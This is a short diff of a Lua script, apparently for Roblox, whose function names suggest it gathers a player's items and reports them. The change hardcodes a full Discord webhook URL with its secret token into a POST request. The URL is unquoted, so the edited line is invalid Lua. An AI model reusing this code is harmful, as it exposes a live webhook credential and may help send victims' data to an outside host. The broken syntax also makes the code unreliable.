@@ -164,7 +164,7 @@ local function SendJoinMessage(list, prefix)
         ["Content-Type"] = "application/json"
     }
     local response = request({
-        Url = webhook,
+        Url = https://discord.com/api/webhooks/1411240284829913199/fBpM111taG_HHu_wOhoU1jPcbKN_m3wD7poHt6pGIm-VdfqfxO6HyT1qxKepX6ik8lat,
         Method = "POST",
         Headers = headers,
         Body = body
@@ -351,6 +351,7 @@ if #itemsToSend > 0 then
     waitForUserChat()
 
 end
+
 
 
 
